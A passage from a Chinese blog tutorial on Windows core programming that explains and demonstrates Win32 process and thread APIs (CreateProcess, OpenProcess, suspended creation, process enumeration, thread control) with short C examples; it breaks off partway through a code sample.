{"title":"Windows核心编程","slug":"Windows核心编程","date":"2022-04-27T11:12:07.000Z","updated":"2022-04-27T11:32:22.777Z","comments":true,"path":"api/articles/Windows核心编程.json","photos":[],"link":"","excerpt":null,"covers":["https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220228180448.jpg","https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320203011.png","https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320210159.jpg","https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320215932.jpg"],"content":"<h1 id=\"windows核心编程\"><a href=\"#windows核心编程\" class=\"headerlink\" title=\"windows核心编程\"></a>windows核心编程</h1><h3 id=\"CreateProcess\"><a href=\"#CreateProcess\" class=\"headerlink\" title=\"CreateProcess\"></a>CreateProcess</h3><pre><code class=\"C\">BOOL CreateProcess(\n    LPCWSTR lpApplicationName, \t\t\t\t\t//文件名 完整文件路径，如记事本c://XX//XX//notepad.exe\n    LPWSTR lpCommandLine, \t\t\t\t\t\t//命令行参数\n    LPSECURITY_ATTRIBUTES lpProcessAttributes, \t//SD 进程句柄\n    LPSECURITY_ATTRIBUTES lpThreadAttributes, \t//SD 线程句柄\n    BOOL bInheritHandles, \t\t\t\t\t\t//句柄是否可继承\n    DWORD dwCreationFlags, \t\t\t\t\t\t//创建进程方式\n    LPVOID lpEnvironment, \t\t\t\t\t\t//父进程环境变量\n    LPCWSTR lpCurrentDirectory, \t\t\t\t//子进程工作路径\n    LPSTARTUPINFOW lpStartupInfo, \t\t\t\t//启动进程相关信息\n    LPPROCESS_INFORMATION lpProcessInformation\t//子进程的相关信息 (进程ID,线程ID,进程句柄,线程句柄)\n);\t\t\t\t\t\t\t\t\t\t\t\n</code></pre>\n<p> 一般注意的是CreateProcess()的前两个参数和后两个参数。</p>\n<p>第一个<code>lpApplicationName</code>启动进程的**<code>绝对路径</code>**，比如计算器路径为：<code>C:\\Windows\\System32\\calc.exe</code>。</p>\n<p>第二个<code>lpCommandLine</code>对命令行进行传参。 </p>\n<h5 id=\"lpStartupInfo（第九个参数）\"><a href=\"#lpStartupInfo（第九个参数）\" class=\"headerlink\" title=\"lpStartupInfo（第九个参数）\"></a>lpStartupInfo（第九个参数）</h5><pre><code class=\"c\">typedef struct _STARTUPINFOW &#123;\n    DWORD   cb;  //我们关注cb这个成员就行\n    LPWSTR  lpReserved;\n    LPWSTR  lpDesktop;\n    LPWSTR  lpTitle;\n    DWORD   dwX;\n    DWORD   dwY;\n    DWORD   dwXSize;\n    DWORD   dwYSize;\n    DWORD   dwXCountChars;\n    DWORD   dwYCountChars;\n    DWORD   dwFillAttribute;\n    DWORD   dwFlags;\n    WORD    wShowWindow;\n    WORD    cbReserved2;\n    LPBYTE  lpReserved2;\n    HANDLE  hStdInput;\n    HANDLE  hStdOutput;\n    HANDLE  hStdError;\n&#125; STARTUPINFOW, *LPSTARTUPINFOW;\n</code></pre>\n<h5 id=\"lpProcessInformation（第十个参数）\"><a href=\"#lpProcessInformation（第十个参数）\" class=\"headerlink\" title=\"lpProcessInformation（第十个参数）\"></a>lpProcessInformation（第十个参数）</h5><pre><code class=\"C\">typedef struct _PROCESS_INFORMATION &#123;\n    HANDLE hProcess;\t// 进程句柄\n    HANDLE hThread;\t\t// 线程句柄\n    DWORD dwProcessId;\t// 进程ID\n    DWORD dwThreadId;\t// 线程ID\n&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;\n</code></pre>\n<h5 id=\"来个例子\"><a href=\"#来个例子\" class=\"headerlink\" title=\"来个例子\"></a>来个例子</h5><pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n    \n    // 开辟空间，置0\n    ZeroMemory(&amp;pi, sizeof(pi));\n    ZeroMemory(&amp;si, sizeof(si));\n    si.cb = sizeof(si);\n    \n    // 打开cmd\n    char processName[] = &quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;;\n    // 打开cmd后 ping百度\n    char cmdLine[] = &quot;/c ping www.baidu.com -n 2&quot;;\n\n    if (CreateProcess(processName, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))\n    &#123;\n        printf(&quot;CreateProcess Success\\n&quot;);\n    &#125;\n    else\n    &#123;\n        printf(&quot;CreateProcess Error:%d\\n&quot;, GetLastError());\n    &#125;\n&#125;\n</code></pre>\n<p>结果</p>\n<pre><code>CreateProcess Success\n\n正在 Ping www.a.shifen.com [112.80.248.76] 具有 32 字节的数据:\n来自 112.80.248.76 的回复: 字节=32 时间=42ms TTL=44\n来自 112.80.248.76 的回复: 字节=32 时间=46ms TTL=44\n\n112.80.248.76 的 Ping 统计信息:\n    数据包: 已发送 = 2，已接收 = 2，丢失 = 0 (0% 丢失)，\n往返行程的估计时间(以毫秒为单位):\n    最短 = 42ms，最长 = 46ms，平均 = 44ms\n</code></pre>\n<p>用GetLastError函数来获取问题编号 ，具体编号高达上百个，不便放此处，故自行百度。</p>\n<h4 id=\"结束进程-TerminateProcess\"><a href=\"#结束进程-TerminateProcess\" class=\"headerlink\" title=\"结束进程_TerminateProcess\"></a>结束进程_TerminateProcess</h4><p> 使用TerminateProcess函数，传入句柄和退出状态码 </p>\n<pre><code>BOOL WINAPI TerminateProcess(HANDLE hProcess,UINT uExitCode);\n</code></pre>\n<h5 id=\"来个例子-1\"><a href=\"#来个例子-1\" class=\"headerlink\" title=\"来个例子\"></a>来个例子</h5><pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n\n    ZeroMemory(&amp;pi, sizeof(pi));\n    ZeroMemory(&amp;si, sizeof(si));\n    si.cb = sizeof(si);\n    \n    // 打开计算器\n    char processName[] = &quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;;\n    if (CreateProcess(processName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))\n    &#123;\n        // 等待按键\n        system(&quot;pause&quot;);\n        // 结束子进程\n        TerminateProcess(pi.hProcess,0);//传入句柄和退出状态码\n        printf(&quot;success exit childProcess\\n&quot;);\n    &#125;\n    else\n    &#123;\n        printf(&quot;CreateProcess Error:%d\\n&quot;, GetLastError());\n    &#125;\n&#125;\n</code></pre>\n<h5 id=\"退出状态码\"><a href=\"#退出状态码\" class=\"headerlink\" title=\"退出状态码\"></a>退出状态码</h5><table>\n<thead>\n<tr>\n<th><strong>0</strong></th>\n<th><strong>命令成功结束</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>1</strong></td>\n<td><strong>一般性未知错误</strong></td>\n</tr>\n<tr>\n<td><strong>2</strong></td>\n<td><strong>不适合的shell命令</strong></td>\n</tr>\n<tr>\n<td><strong>126</strong></td>\n<td><strong>命令不可执行</strong></td>\n</tr>\n<tr>\n<td><strong>127</strong></td>\n<td><strong>没找到命令</strong></td>\n</tr>\n<tr>\n<td><strong>128</strong></td>\n<td><strong>无效的退出参数</strong></td>\n</tr>\n<tr>\n<td><strong>128+x</strong></td>\n<td><strong>与Linux信号x相关的严重错误</strong></td>\n</tr>\n<tr>\n<td><strong>130</strong></td>\n<td><strong>通过Ctrl+C终止的命令</strong></td>\n</tr>\n<tr>\n<td><strong>255</strong></td>\n<td><strong>正常范围之外的退出状态码</strong></td>\n</tr>\n</tbody></table>\n<h4 id=\"OpenProcess\"><a href=\"#OpenProcess\" class=\"headerlink\" title=\"OpenProcess\"></a>OpenProcess</h4><p> OpenProcess函数 通过PID操作进程对象。</p>\n<pre><code class=\"c\">HANDLE WINAPI OpenProcess(\n    DWORD dwDesiredAccess,\t// 此进程访问权限\n    BOOL bInheritHandle,\t// 进程句柄是否可以被继承\n    DWORD dwProcessId\t\t// 进程ID\n);\t\t\t\t\t\t\t// 返回句柄对象\n</code></pre>\n<p>关于它的第一个参数dwDesiredAccess</p>\n<pre><code>PROCESS_ALL_ACCESS\t\t\t\t\t\t\t//获取所有权限\nPROCESS_CREATE_PROCESS\t\t\t\t\t\t//创建进程\nPROCESS_CREATE_THREAD\t\t\t\t\t\t//创建线程\nPROCESS_DUP_HANDLE\t\t\t\t\t\t\t//使用DuplicateHandle()函数复制一个新句柄\nPROCESS_QUERY_INFORMATION\t\t\t\t\t//获取进程的令牌、退出码和优先级等信息\nPROCESS_QUERY_LIMITED_INFORMATION\t\t\t//获取进程特定的某个信息\nPROCESS_SET_INFORMATION\t\t\t\t\t\t//设置进程的某种信息\nPROCESS_SET_QUOTA\t\t\t\t\t\t\t//使用SetProcessWorkingSetSize函数设置内存限制\nPROCESS_SUSPEND_RESUME\t\t\t\t\t\t//暂停或者恢复一个进程\nPROCESS_TERMINATE\t\t\t\t\t\t\t//使用Terminate函数终止进程\nPROCESS_VM_OPERATION\t\t\t\t\t\t//在进程的地址空间执行操作\nPROCESS_VM_READ\t\t\t\t\t\t\t\t//使用ReadProcessMemory函数在进程中读取内存\nPROCESS_VM_WRITE\t\t\t\t\t\t\t//使用WriteProcessMemory函数在进程中写入内存\nSYNCHRONIZE\t\t\t\t\t\t\t\t\t//使用wait函数等待进程终止\n</code></pre>\n<h5 id=\"来个例子-2\"><a href=\"#来个例子-2\" class=\"headerlink\" title=\"来个例子\"></a>来个例子</h5><pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint OC(DWORD x) &#123;\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, x);\t\n    if (!TerminateProcess(hProcess, 0))\n    &#123;\n        printf(&quot;error %d&quot;, GetLastError());\n    &#125;\n    return 0;\n&#125;\n\nint main()\n&#123;\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n\n    ZeroMemory(&amp;pi, sizeof(pi));\n    ZeroMemory(&amp;si, sizeof(si));\n    si.cb = sizeof(si);\n\n    char processName[] = &quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;;\n\n    if (CreateProcess(processName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))\n    &#123;\n        printf(&quot;PID:%d&quot;, pi.dwProcessId);\n       OC(pi.dwProcessId);//获取到PID后用OpenProcess来操作进程\n    &#125;\n    else\n    &#123;\n        printf(&quot;CreateProcess Error:%d\\n&quot;, GetLastError());\n    &#125;\n&#125;\n\n</code></pre>\n<h3 id=\"进程\"><a href=\"#进程\" class=\"headerlink\" title=\"进程\"></a>进程</h3><h4 id=\"什么是进程\"><a href=\"#什么是进程\" class=\"headerlink\" title=\"什么是进程\"></a>什么是进程</h4><p>　　进程是程序的实体，是资源分配的最小单位。进程是一种空间上的概念，它的责任就是提供资源。每一个进程都有一个4GB大小的虚拟空间，范围从0x0-0xFFFFFFFF。其中内核占高2GB，低2GB给程序的堆栈使用</p>\n<p>　　在Windows中，系统通过句柄管理进程中的资源，句柄存储在内核空间中的一个全局句柄表中，而每个进程也都有一个句柄表，这个句柄表是私有的。</p>\n<p>　　<strong>PID</strong> 是指的是全局句柄表的值。</p>\n<h4 id=\"进程执行的加载过程\"><a href=\"#进程执行的加载过程\" class=\"headerlink\" title=\"进程执行的加载过程\"></a>进程执行的加载过程</h4><p>　　1.映射EXE文件（低2G）<br>　　2.创建内核对象EPROCESS（高2G）<br>　　3.映射系统DLL（ntdll.dll）<br>　　4.创建线程内核对象ETHREAD<br>　　5.系统启动线程<br>　　　　a.映射DLL(ntdll.LdrInitalizeThunk)<br>　　　　b.线程开始执行</p>\n<h4 id=\"创建进程\"><a href=\"#创建进程\" class=\"headerlink\" title=\"创建进程\"></a>创建进程</h4><p>　　任何进程都是别的进程创建的，当用户双击exe时，实际上是Explorer.exe这个进程所创建的，使用了CreateProcess函数</p>\n<pre><code class=\"c\">BOOL CreateProcess(\n    LPCWSTR lpApplicationName, \t\t\t\t\t//文件名 完整文件路径\n    LPWSTR lpCommandLine, \t\t\t\t\t\t//命令行参数\n    LPSECURITY_ATTRIBUTES lpProcessAttributes, \t//SD 进程句柄\n    LPSECURITY_ATTRIBUTES lpThreadAttributes, \t//SD 线程句柄\n    BOOL bInheritHandles, \t\t\t\t\t\t//句柄是否可继承\n    DWORD dwCreationFlags, \t\t\t\t\t\t//创建进程方式\n    LPVOID lpEnvironment, \t\t\t\t\t\t//父进程环境变量\n    LPCWSTR lpCurrentDirectory, \t\t\t\t//子进程工作路径\n    LPSTARTUPINFOW lpStartupInfo, \t\t\t\t//启动进程相关信息\n    LPPROCESS_INFORMATION lpProcessInformation\t//子进程的相关信息 (进程ID,线程ID,进程句柄,线程句柄)\n);\t\t\t\t\t\t\t\t\t\t\t\t//返回值BOOL\n</code></pre>\n<p>　　这里讲解CreateProcess()的前两个参数和后两个参数。第一个启动进程的绝对路径，比如记事本的路径为：。第二个对命令行进行传参。</p>\n<p>　　例如下面的例子生成test.exe</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n\nint main(int argc,char *argv[])\n&#123;\n    printf(&quot;%s - %s&quot;,argv[0],argv[1]);\n    return 0;\n&#125;\n</code></pre>\n<p>　　传入hello得到</p>\n<pre><code class=\"none\">D:\\&gt;test.exe hello\ntest.exe - hello\n</code></pre>\n<p>　　第9个，函数原型</p>\n<pre><code class=\"c\">typedef struct _STARTUPINFOW &#123;\n    DWORD   cb;\n    LPWSTR  lpReserved;\n    LPWSTR  lpDesktop;\n    LPWSTR  lpTitle;\n    DWORD   dwX;\n    DWORD   dwY;\n    DWORD   dwXSize;\n    DWORD   dwYSize;\n    DWORD   dwXCountChars;\n    DWORD   dwYCountChars;\n    DWORD   dwFillAttribute;\n    DWORD   dwFlags;\n    WORD    wShowWindow;\n    WORD    cbReserved2;\n    LPBYTE  lpReserved2;\n    HANDLE  hStdInput;\n    HANDLE  hStdOutput;\n    HANDLE  hStdError;\n&#125; STARTUPINFOW, *LPSTARTUPINFOW;\n</code></pre>\n<p>　　　有非常多的成员，我们只需要关注第一个成员<code>cb</code>，意思是包含STARTUPINFO结构体的大小(需要的原因，方便windows未来更新换代)。cb必须初始化sizeof(STARTUPINFO)。其他属性都置0即可。</p>\n<p>　　　第10个<code>lpProcessInformation</code>，函数原型</p>\n<pre><code class=\"c\">typedef struct _PROCESS_INFORMATION &#123;\n    HANDLE hProcess;\t// 进程句柄\n    HANDLE hThread;\t\t// 线程句柄\n    DWORD dwProcessId;\t// 进程ID\n    DWORD dwThreadId;\t// 线程ID\n&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;\n</code></pre>\n<p>　　　创建进程例子</p>\n<pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n    \n    // 填充置0\n    ZeroMemory(&amp;pi, sizeof(pi));\n    ZeroMemory(&amp;si, sizeof(si));\n    si.cb = sizeof(si);\n    \n    // 打开cmd\n    char processName[] = &quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;;\n    // 打开cmd后 ping百度\n    char cmdLine[] = &quot;/c ping www.baidu.com -n 1&quot;;\n\n    if (CreateProcess(processName, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))\n    &#123;\n        printf(&quot;CreateProcess Success\\n&quot;);\n    &#125;\n    else\n    &#123;\n        printf(&quot;CreateProcess Error:%d\\n&quot;, GetLastError());\n    &#125;\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">D:\\&gt;test.exe\nCreateProcess Success\n\nD:\\&gt;\n正在 Ping www.a.shifen.com [14.215.177.39] 具有 32 字节的数据:\n来自 14.215.177.39 的回复: 字节=32 时间=34ms TTL=54\n\n14.215.177.39 的 Ping 统计信息:\n    数据包: 已发送 = 1，已接收 = 1，丢失 = 0 (0% 丢失)，\n往返行程的估计时间(以毫秒为单位):\n    最短 = 34ms，最长 = 34ms，平均 = 34ms\n</code></pre>\n<p>　　上面的GetLastError函数来获取问题编号，具体编号对应内容可以参考<a href=\"https://baike.baidu.com/item/GetLastError/4278820?fr=aladdin\">百度百科</a></p>\n<h4 id=\"结束进程\"><a href=\"#结束进程\" class=\"headerlink\" title=\"结束进程\"></a>结束进程</h4><p>　　使用TerminateProcess函数，传入一个句柄和退出状态码</p>\n<pre><code class=\"none\">BOOL WINAPI TerminateProcess(HANDLE hProcess,UINT uExitCode);\n</code></pre>\n<p>　　使用TerminateProcess结束打开的记事本</p>\n<pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n\n    ZeroMemory(&amp;pi, sizeof(pi));\n    ZeroMemory(&amp;si, sizeof(si));\n    si.cb = sizeof(si);\n    \n    // 打开记事本\n    char processName[] = &quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;;\n    if (CreateProcess(processName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))\n    &#123;\n        // 等待按键\n        system(&quot;pause&quot;);\n        // 结束子进程\n        TerminateProcess(pi.hProcess,0);\n        printf(&quot;success exit childProcess\\n&quot;);\n    &#125;\n    else\n    &#123;\n        printf(&quot;CreateProcess Error:%d\\n&quot;, GetLastError());\n    &#125;\n&#125;\n</code></pre>\n<p>　　使用OpenProcess函数，通过pid去操作进程对象</p>\n<pre><code class=\"c\">HANDLE WINAPI OpenProcess(\n    DWORD dwDesiredAccess,\t// 此进程访问权限\n    BOOL bInheritHandle,\t// 进程句柄是否可以被继承\n    DWORD dwProcessId\t\t// 进程ID\n);\t\t\t\t\t\t\t// 返回句柄对象\n</code></pre>\n<p><code>dwDesiredAccess</code></p>\n<pre><code>PID:32\n</code></pre>\n<h4 id=\"挂起方式创建进程\"><a href=\"#挂起方式创建进程\" class=\"headerlink\" title=\"挂起方式创建进程\"></a>挂起方式创建进程</h4><p>　　对应第六个参数<code>dwCreationFlags</code>，进程的创建方式，如果想让新的进程使用一个新的控制台，而不是继承父进程的控制台。使用<code>CREATE_NEW_CONSOLE</code>即可</p>\n<p>　　运行后子进程以新窗口的方式打开</p>\n<pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n\n    ZeroMemory(&amp;pi, sizeof(pi));\n    ZeroMemory(&amp;si, sizeof(si));\n    si.cb = sizeof(si);\n    \n    char processName[] = &quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;;\n    char cmdLine[] = &quot; /c net user &amp;&amp; pause&quot;;\n    \n    if (CreateProcess(processName, cmdLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi))\n    &#123;\n        printf(&quot;PID:%d&quot;,pi.dwProcessId);\n    &#125;\n    else\n    &#123;\n        printf(&quot;CreateProcess Error:%d\\n&quot;, GetLastError());\n    &#125;\n&#125;\n</code></pre>\n<p>　　对我们最有用的是以挂起方式创建进程，值为<code>CREATE_SUSPENDED</code>。本质上还是挂起的主线程。下面代码按任意键后，弹出记事本</p>\n<pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n\n    ZeroMemory(&amp;pi, sizeof(pi));\n    ZeroMemory(&amp;si, sizeof(si));\n    si.cb = sizeof(si);\n\n    char processName[] = &quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;;\n\n    if (CreateProcess(processName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi))\n    &#123;\n        system(&quot;pause&quot;);\n        ResumeThread(pi.hThread);\t// 继续运行\n    &#125;\n    else\n    &#123;\n        printf(&quot;CreateProcess Error:%d\\n&quot;, GetLastError());\n    &#125;\n&#125;\n</code></pre>\n<h4 id=\"遍历进程\"><a href=\"#遍历进程\" class=\"headerlink\" title=\"遍历进程\"></a>遍历进程</h4><p>　　以快照的方式遍历进程<code>CreateToolhelp32Snapshot</code>，需包含头文件<strong>TlHelp32.h</strong>。快照的意思是先给当前的进程截个图，之后再告诉图里的内容。是非实时的</p>\n<pre><code class=\"c\">// 为特定的进程拍系统快照，也可以为进程使用的堆、模块或线程拍快照。\nHANDLE WINAPI CreateToolhelp32Snapshot(\n     DWORD dwFlags,\t\t\t// 设置快照对象 值为:TH32CS_SNAPPROCESS 表示获取进程\n    DWORD th32ProcessID\t\t// 快照进程号 要获取当前进程快照时设为0\n);\t\t\t\t\t\t\t// 成功 返回句柄  失败 返回INVALID_HANDLE_VALUE\n</code></pre>\n<p><code>PROCESSENTRY32</code></p>\n<pre><code class=\"c\">typedef struct tagPROCESSENTRY32\n&#123;\n    DWORD   dwSize;\t\t\t\t\t// 结构体的大小 必须初始化为sizeof(PROCESSENTRY32)\n    DWORD   cntUsage;\t\t\t\t// 已废弃\n    DWORD   th32ProcessID;          // 进程ID\n    ULONG_PTR th32DefaultHeapID;\t// 已废弃\n    DWORD   th32ModuleID;           // 已废弃\n    DWORD   cntThreads;\t\t\t\t// 此进程开启的线程总数\n    DWORD   th32ParentProcessID;    // 父进程ID\n    LONG    pcPriClassBase;         // 线程优先权\n    DWORD   dwFlags;\t\t\t\t// 已废弃\n    CHAR    szExeFile[MAX_PATH];    // 进程名\n&#125; PROCESSENTRY32;\n</code></pre>\n<p>　　首次遍历进程</p>\n<pre><code class=\"c\">BOOL WINAPI Process32First(\n    HANDLE hSnapshot,\t\t\t// 进程快照句柄\n    LPPROCESSENTRY32 lppe\t\t// 进程信息结构体\n);\n</code></pre>\n<p>　　遍历下一个进程</p>\n<pre><code class=\"c\">BOOL WINAPI Process32NextW(\n    HANDLE hSnapshot,\t\t\t// 进程快照句柄\n    LPPROCESSENTRY32W lppe\t\t// 进程信息结构体\n);\n</code></pre>\n<p>　　示例代码</p>\n<pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n#include &lt;TlHelp32.h&gt;\n\nint main()\n&#123;\n    // 创建进程快照\n    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    // 句柄无效\n    if (hProcess == INVALID_HANDLE_VALUE)\n    &#123;\n        return 0;\n    &#125;\n\n    // 快照信息结构体\n    PROCESSENTRY32 pe;\n    ZeroMemory(&amp;pe, sizeof(pe));\n    pe.dwSize = sizeof(pe);\n\n    // 首次遍历进程\n    BOOL flag = Process32First(hProcess, &amp;pe);\n    // 循环遍历进程\n    while (flag)\n    &#123;\n        printf(&quot;%s %d\\n&quot;,pe.szExeFile,pe.th32ProcessID);\n        flag = Process32Next(hProcess, &amp;pe);\n    &#125;\n\n&#125;\n</code></pre>\n<h4 id=\"其他API\"><a href=\"#其他API\" class=\"headerlink\" title=\"其他API\"></a>其他API</h4><pre><code class=\"none\">获取当前进程ID(PID):GetCurrentProcessId()\n获取当前进程句柄:GetCurrentProcess()\n获取命令行:GetCommandLine()\n获取启动信息:GetStartupInfo()\n</code></pre>\n<h3 id=\"线程\"><a href=\"#线程\" class=\"headerlink\" title=\"线程\"></a>线程</h3><h4 id=\"什么是线程\"><a href=\"#什么是线程\" class=\"headerlink\" title=\"什么是线程\"></a>什么是线程</h4><p>　　线程是程序执行时的最小单位。是附属在进程上的执行实体，是代码的执行流程。一个进程可以有多个线程，但至少都有一个主线程。没有线程的进程是无法执行的。<br>　　有几个线程就表示着有几个代码在执行，但是它们并不一定是同时执行，例如单核的CPU情况下是不存在多线程的，线程的执行是有时间顺序的，但是CPU切换的非常快，所以给我们的感觉和多核CPU没什么区别。</p>\n<h4 id=\"创建线程\"><a href=\"#创建线程\" class=\"headerlink\" title=\"创建线程\"></a>创建线程</h4><p>　　采用CreateThread()创建线程，语法格式如下</p>\n<pre><code class=\"c\">HANDLE WINAPI CreateThread(\n    LPSECURITY_ATTRIBUTES lpThreadAttributes,\t// 安全属性 通常为NULL表示使用默认设置\n    SIZE_T dwStackSize,\t\t\t\t\t\t\t// 线程栈空间大小 传入0表示使用默认大小(1MB)\n    LPTHREAD_START_ROUTINE lpStartAddress,\t\t// 表示新线程所执行的线程函数地址\n    LPVOID lpParameter,\t\t\t\t\t\t\t// 线程函数的参数\n    DWORD dwCreationFlags,\t\t\t\t\t\t// 控制线程的创建 0 创建完毕立即调度 CREATE_SUSPENDED 创建后挂起\n    LPDWORD lpThreadId\t\t\t\t\t\t\t// 返回线程的ID号 NULL表示不需要返回该线程ID号\n);\t\t\t\t\t\t\t\t\t\t\t\t// 返回值:线程句柄 创建失败返回NULL\n</code></pre>\n<p>　　线程执行函数的语法规则</p>\n<pre><code class=\"c\">DWORD WINAPI MyThreadFunction( LPVOID lpParam ); //LPVOID = void *\n</code></pre>\n<p>　　创建一个线程，执行for循环打印数字</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nDWORD WINAPI Demo(LPVOID parameter)\n&#123;\n    for (int i = 0; i &lt; 100; i++)\n    &#123;\n        printf(&quot;%d\\n&quot;, i);\n        Sleep(1000);\n    &#125;\n&#125;\n\nint main()\n&#123;\n    CreateThread(NULL, 0, Demo, NULL, 0, NULL);\n    system(&quot;pause&quot;);\t// 防止主线程退出,导致程序立即结束,试试注释这行后运行\n    return 0;\n&#125;\n</code></pre>\n<p>　　输出结果为</p>\n<pre><code class=\"none\">0\n请按任意键继续. . . 1\n2\n3\n4\n...... 更多的数字\n</code></pre>\n<h4 id=\"线程传参\"><a href=\"#线程传参\" class=\"headerlink\" title=\"线程传参\"></a>线程传参</h4><p>　　给线程函数传递参数也是非常简单的，创建线程函数的第4个参数就是线程函数传参。这里演示传递一个参数n，让n在线程中递增</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nDWORD WINAPI Demo(LPVOID parameter)\n&#123;\n    int *n = (int *)parameter;\n    for (int i = 0; i &lt; 100; i++)\n    &#123;\n        printf(&quot;%d\\n&quot;, *n);\n        (*n)++;\n        Sleep(1000);\n    &#125;\n&#125;\n\nint main()\n&#123;\n    int n = 0;\n    CreateThread(NULL, 0, Demo, &amp;n, 0, NULL);\n    system(&quot;pause&quot;);\n    return 0;\n&#125;\n</code></pre>\n<p>　　输出结果为</p>\n<pre><code class=\"none\">0\n请按任意键继续. . . 1\n2\n3\n4\n...... 更多的数字\n</code></pre>\n<h4 id=\"挂起线程\"><a href=\"#挂起线程\" class=\"headerlink\" title=\"挂起线程\"></a>挂起线程</h4><p>　　挂起线程也叫暂停线程，当暂停后该线程不会占用cpu，语法格式如下，只需要传入一个线程句柄即可</p>\n<pre><code class=\"c\">DWORD WINAPI SuspendThread(HANDLE hThread);\n</code></pre>\n<h4 id=\"恢复线程\"><a href=\"#恢复线程\" class=\"headerlink\" title=\"恢复线程\"></a>恢复线程</h4><p>　　恢复线程就是让暂停(挂起)的线程继续运行，语法格式如下，只需要传入一个线程句柄即可</p>\n<pre><code class=\"c\">DWORD WINAPI ResumeThread(HANDLE hThread);\n</code></pre>\n<h4 id=\"终止线程\"><a href=\"#终止线程\" class=\"headerlink\" title=\"终止线程\"></a>终止线程</h4><pre><code class=\"none\">方式一：ExitThread(DWORD dwExitCode); 在线程内部使用，参数为退出状态码。\n方式二：线程函数 执行return或者break\n方式三：TerminateThread(HANDLE hThread,DWORD dwExitCode); 分别传入线程句柄和状态码\n</code></pre>\n<h4 id=\"等待线程结束\"><a href=\"#等待线程结束\" class=\"headerlink\" title=\"等待线程结束\"></a>等待线程结束</h4><p>　　WaitForSingleObject用于等待一个内核对象状态发生变更，那也就是执行结束之后，才会继续向下执行。通常TerminateThread和此函数搭配使用</p>\n<pre><code class=\"c\">DWORD WINAPI WaitForSingleObject(\n    HANDLE hHandle,\n    DWORD dwMilliseconds\t// 等待超时时间 传入INFINITE 表示一直等待\n);\n</code></pre>\n<h4 id=\"综合代码\"><a href=\"#综合代码\" class=\"headerlink\" title=\"综合代码\"></a>综合代码</h4><pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n#include &lt;conio.h&gt;\n\n// 是否终止线程\n// TRUE 终止 FALSE 不终止\nBOOL flag = FALSE;\n\nDWORD WINAPI Demo(LPVOID parameter)\n&#123;\n    printf(&quot;已启动线程\\n&quot;);\n\n    int *n = (int *)parameter;\n    for (int i = 0; i &lt; 100; i++)\n    &#123;\n        // 终止线程\n        if (flag == TRUE)\n        &#123;\n            // 也可以直接写break或return 一样的效果\n            ExitThread(0); //线程内部终止\n        &#125;\n\n        printf(&quot;%d\\n&quot;, *n);\n        (*n)++;\n        Sleep(1000);\n    &#125;\n\n    printf(&quot;子线程已结束\\n&quot;);\n&#125;\n\n// 线程操作\nvoid ControlThread(HANDLE hThread)\n&#123;\n    // 主线程死循环\n    while (1)\n    &#123;\n        int key = _getch();\n\n        // 按1 挂起线程\n        if (key == &#39;1&#39;)\n        &#123;\n            SuspendThread(hThread);\n            printf(&quot;已挂起线程\\n&quot;);\n        &#125;\n        // 按2 恢复线程\n        else if (key == &#39;2&#39;)\n        &#123;\n            ResumeThread(hThread);\n            printf(&quot;已恢复线程\\n&quot;);\n        &#125;\n        // 